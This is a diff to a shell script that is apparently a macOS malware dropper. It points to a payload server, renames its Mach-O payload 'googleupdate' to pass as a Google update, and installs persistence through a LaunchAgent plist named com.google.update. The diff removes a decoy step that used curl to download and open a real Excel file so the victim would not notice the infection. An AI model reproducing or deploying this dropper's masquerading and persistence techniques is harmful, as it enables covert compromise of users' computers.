@@ -7,9 +7,6 @@ URL="https://192.168.1.5:8443/osx"
 # URL hosting our plist file
 PLISTURL="https://192.168.1.5:8443/plist"
 
-# URL to download a real excel file
-EXCELURL="https://192.168.1.5:8443/excel.xls"
-
 # Rename our payload macho-o name
 PAYLOAD="googleupdate"
 
@@ -48,7 +45,3 @@ USERNAME=$(whoami)
 sed -i .bak "s/replaceme/$USERNAME/g" ~/Library/LaunchAgents/com.google.update.plist
 # Remove backup file
 rm ~/Library/LaunchAgents/com.google.update.plist.bak
-
-# Download and open a real file excel
-curl -k -s $EXCELURL -o excel.xlsx
-open excel.xlsx
